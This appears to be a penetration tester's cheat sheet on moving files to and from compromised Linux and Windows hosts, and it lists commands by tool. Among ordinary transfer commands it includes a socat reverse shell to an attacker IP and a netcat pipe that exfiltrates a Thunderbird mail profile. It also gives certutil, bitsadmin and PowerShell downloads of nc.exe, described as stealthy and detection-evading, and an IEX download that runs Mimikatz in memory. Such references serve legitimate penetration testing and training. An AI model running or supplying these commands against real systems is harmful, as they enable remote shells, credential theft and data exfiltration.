---
icon: tornado
description: Listeners and binaries
---

# File Transfer

## <mark style="color:purple;">Linux</mark>

{% hint style="warning" %}
### <mark style="color:purple;">`base64`</mark>

* <mark style="color:purple;">Using</mark> <mark style="color:orange;">**`base64`**</mark> <mark style="color:purple;">help to keep file integrity</mark>
* <mark style="color:purple;">Check hashes to avoid file corruption</mark>

{% code title="Generate hash" %}
```sh
md5sum <file>
```
{% endcode %}

***

### <mark style="color:purple;">Encoding</mark>

{% code title="Encode File + Redirect Output" %}
```bash
base64 file.txt > hash.txt
```
{% endcode %}

{% code title="Encode String + Redirect Output" %}
```bash
echo "your_string_here" | base64 > encoded_file.txt
```
{% endcode %}

* <mark style="color:purple;">In</mark> <mark style="color:orange;">**`Base64`**</mark> <mark style="color:purple;">encoding, by default, some implementations add line breaks every</mark> <mark style="color:purple;"></mark>_<mark style="color:purple;">76 characters</mark>_ <mark style="color:purple;"></mark><mark style="color:purple;">(following the</mark> <mark style="color:orange;">`RFC 2045 standard`</mark><mark style="color:purple;">).</mark>

{% code title="Encode File Without line break" %}
```bash
base64 -w 0 <file>
```
{% endcode %}

{% code title="Encode String without line breaks" %}
```bash
echo -n "your_string_here" | base64 -w 0
```
{% endcode %}

***

{% code title="Safe URL encoding" %}
```bash
base64 -w 0 <file> | tr '+/' '-_' > url_safe_encoded.txt
```
{% endcode %}

### <mark style="color:purple;">Decoding</mark>

{% code title="Decode String + Output to a file" %}
```bash
echo <string> | base64 -d > <file>
```
{% endcode %}

{% code title="Decode File + Output to a file" %}
```bash
base64 -d -i <file> > <decoded_file>
```
{% endcode %}

{% code title="Decode File without line breaks" %}
```bash
base64 -d -w 0 file.txt > decoded_output.bin
```
{% endcode %}
{% endhint %}

***

## <mark style="color:purple;">Techniques</mark>

{% tabs %}
{% tab title="Python Web Server" %}
{% code title="Host" %}
```sh
python3 -m http.server 443
```
{% endcode %}

***

#### <mark style="color:purple;">Client</mark>

{% code title="curl" %}
```sh
curl -o IP:Port/file
```
{% endcode %}

{% code title="wget" %}
```bash
wget IP:Port/file
```
{% endcode %}
{% endtab %}

{% tab title="Netcat" %}
{% code title="Host" %}
```sh
nc -lvp <Local_IP> > file
```
{% endcode %}

{% code title="Client" %}
```sh
nc <Target_IP> <port> < file
```
{% endcode %}

* <mark style="color:purple;">For entire directories is good practice to use</mark> <mark style="color:orange;">**`tar`**</mark><mark style="color:purple;">:</mark>

{% code title="Listener" %}
```sh
nc -lvp 4445 > .thunderbird.tar
```
{% endcode %}

{% code title="Client" %}
```sh
tar -cf - .thunderbird | nc 10.10.16.10 4445
```
{% endcode %}

***

{% code title="With cat" %}
```sh
cat <file> | nc Target_IP 443
```
{% endcode %}
{% endtab %}

{% tab title="Apache" %}
### <mark style="color:purple;">Copy a file into Apache Web Directory</mark>

* <mark style="color:purple;">With the right permissions, you can copy the file to</mark> <mark style="color:orange;">**`/var/www/html`**</mark> <mark style="color:purple;">so it can be access from the URL</mark> <mark style="color:orange;">**`http://<server-ip>/file.txt`**</mark><mark style="color:purple;">**.**</mark>

```bash
cp archivo.txt /var/www/html
```

* <mark style="color:purple;">Enable permissions</mark>

{% code title="Give ownership to the web user" %}
```bash
sudo chown www-data:www-data /var/www/html/archivo.txt
```
{% endcode %}

{% code title="Set the file to be read by everyone" %}
```bash
sudo chmod 644 /var/www/html/archivo.txt
```
{% endcode %}

### <mark style="color:purple;">Uploading via Apache (web interface)</mark>

* <mark style="color:purple;">Ensure the appropriate</mark> <mark style="color:orange;">**`upload_max_filesize`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`post_max_size`**</mark> <mark style="color:purple;">directives are set in the</mark> <mark style="color:orange;">**`php.ini`**</mark> <mark style="color:purple;">file.</mark>
* <mark style="color:purple;">Normally is located here</mark> <mark style="color:orange;">**`/etc/php/7.x/apache2/php.ini`**</mark>

```ini
upload_max_filesize = 50M
post_max_size = 50M
```
{% endtab %}

{% tab title="SSH (scp)" %}
{% code title="From local machine to remote host" %}
```sh
scp localfile username@remotehost:/path/to/destination/
```
{% endcode %}

{% code title="From remote host to local machine" %}
```bash
scp username@remotehost:/path/to/remotefile /local/path/
```
{% endcode %}

{% code title="Specific Port" %}
```bash
scp -P 47502 linpeas.sh user1@83.136.252.198:/home/user1
```
{% endcode %}

{% code title="With key" %}
```bash
scp -i ~/.ssh/key linpeas.sh professor@10.10.10.131:/home/professor/
```
{% endcode %}

{% code title="From local to Apache Server" %}
```bash
scp archivo.txt user@remote-server:/var/www/html/
```
{% endcode %}
{% endtab %}

{% tab title="Socat" %}
{% code title="Listener" %}
```sh
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
{% endcode %}

{% code title="Target Machine" %}
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
{% endcode %}
{% endtab %}

{% tab title="PHP" %}
{% code title="One liner" overflow="wrap" %}
```sh
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:purple;">Windows</mark>

{% tabs %}
{% tab title="certutil" %}
{% code title="First, start a python web server" %}
```sh
python3 -m http.server 443
```
{% endcode %}

{% code title="Then" %}
```powershell
certutil.exe -f -urlcache -split http://<IP>/<file>
```
{% endcode %}

{% code title="Sneaky Version" %}
```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
{% endcode %}
{% endtab %}

{% tab title="Invoke-WebRequest" %}
{% code title="First, start a python web-server" %}
```bash
python3 -m http.server 443
```
{% endcode %}

{% code title="Then" %}
```powershell
IWR -uri http://<ip>/<file> -OutFile <file_name>
```
{% endcode %}

{% code title="Uses Chrome User Agent" overflow="wrap" %}
```powershell
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```
{% endcode %}

{% code title="Upload a file" overflow="wrap" %}
```powershell
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```
{% endcode %}
{% endtab %}

{% tab title="Impacket" %}
{% code title="First, create a SMB share folder" %}
```bash
impacket-smbserver <share_name> <file_path> -smb2support
```
{% endcode %}

{% code title="Then, copy the files" %}
```powershell
copy \\<ip>\share\<file> <destination_path>
```
{% endcode %}
{% endtab %}

{% tab title="curl/wget" %}
{% code title="curl" %}
```powershell
curl http://ip/file -o <output>
```
{% endcode %}

{% code title="wget" %}
```powershell
wget http://ip/file -OutFile <output>
```
{% endcode %}
{% endtab %}

{% tab title="System.Net.WebClient" %}
{% code title="" %}
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/file', '<output>')
```
{% endcode %}
{% endtab %}

{% tab title="Bitsadmin" %}
* ### <mark style="color:purple;">Use Case:</mark>
  * <mark style="color:purple;">Download files stealthily.</mark>
  * <mark style="color:purple;">Evade detection, as</mark> <mark style="color:orange;">**`bitsadmin`**</mark> <mark style="color:purple;">is a native tool and might be overlooked by some security solutions.</mark>

```sh
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

{% code title="Modern Version" overflow="wrap" %}
```powershell
Start-BitsTransfer -Source http://10.10.10.32/nc.exe -Destination C:\Temp\nc.exe
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="info" %}
### <mark style="color:purple;">In-memory execution</mark>

{% code title="Mimikatz" overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
```
{% endcode %}
{% endhint %}

## <mark style="color:purple;">Useful binaries</mark>

{% embed url="https://github.com/andrew-d/static-binaries" %}
